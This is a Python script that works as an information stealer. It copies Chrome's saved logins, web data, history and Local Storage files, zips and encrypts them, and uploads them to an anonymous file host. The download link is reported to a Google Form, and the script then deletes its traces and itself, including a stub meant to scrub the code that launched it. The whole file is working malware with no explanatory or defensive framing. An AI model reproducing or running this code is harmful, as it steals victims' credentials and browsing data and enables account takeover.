# from infozipper import genZip
import requests  # dependency
import pyscrypt  # dependency
from shutil import make_archive, copytree, ignore_patterns, copyfile
from shutil import rmtree
from pathlib import Path
from os import remove
import sys
import subprocess


def get_datadir():
    home = Path.home()
    return home / "AppData/Local"


def genZip():
    chrome = get_datadir() / 'Google' / 'Chrome' / 'User Data'
    default_chrome = chrome / 'Default'
    leveldb = default_chrome / 'Local Storage' / 'leveldb'

    curr_folder = Path('.') / '.temporary_folder'
    if leveldb.is_dir():
        '''Find chrome default folder'''
        copytree(str(leveldb.absolute()), str(curr_folder.absolute()),
                 ignore=ignore_patterns('LOCK'))

    for value in ['History', 'Web Data', 'Login Data']:
        srcfile = default_chrome / value
        dstfile = curr_folder / value
        if srcfile.is_file():
            copyfile(str(srcfile.absolute()), str(dstfile.absolute()))

    # now zip
    make_archive('temp', 'zip', str(curr_folder.absolute()))

    # delete folder
    rmtree(str(curr_folder.absolute()))


def EncryptFile(srcfile, dstfile, password_bytes):
    '''
    Receives a srcfile path and dstfile path, and a password IN BYTES,
    encrypts srcfile to dstfile using scrypt encryption method based
    on password key '''
    reader = open(srcfile, "rb")
    sf = pyscrypt.ScryptFile(dstfile, password_bytes, 1024, 1, 1)
    sf.write(reader.read())
    sf.finalize()
    reader.close()


def exportToForm(info):
    formid = 'e/1FAIpQLSc-0I1rQ0vITzjCjIgQkA7niI4RD7gQ7LGkldl1Pn8Ui6KEtQ'
    formboxid = '1938046553'
    submission = {'entry.{0}'.format(formboxid): info}
    url = 'https://docs.google.com/forms/d/{0}/formResponse'.format(formid)
    requests.post(url, submission)


def uploadAndReport():
    ''' Upload, report the url to form '''
    filepath = str((Path('.') / 'encrypted.scrypt').absolute())
    params = {'expires_at': DURATION, 'no_index': 'true'}

    r = requests.post('https://api.anonymousfiles.io/', params,
                      files={'file': open(filepath, 'rb')})

    url = r.json()['url']
    exportToForm(url)


def reWritePayloadFile():
    '''Rewrite the payload file, so that no trace is
    left on the code that initially executed this header.py'''

    pass


try:
    DURATION = '2h'  # possible 1w 2h 3d
    PASSWORD = b'2uLtAQj8fuJIrYb6A67vgN5Lrv2rj8Co2NiKOxdDm066hpdbLKiNYzLbqoXxz5U4fZ0hLLj1UiyEKj9TaBCgYU'

    genZip()
    EncryptFile('temp.zip', 'encrypted.scrypt', PASSWORD)
    uploadAndReport()
    reWritePayloadFile()
finally:
    curr_folder = Path('.') / 'temp.zip'
    if curr_folder.is_file():
        remove(str(curr_folder.absolute()))

    curr_folder = Path('.') / 'encrypted.scrypt'
    if curr_folder.is_file():
        remove(str(curr_folder.absolute()))

    filepath = str((Path(__file__)))
    subprocess.Popen('del' + ' ' + filepath, shell=True)
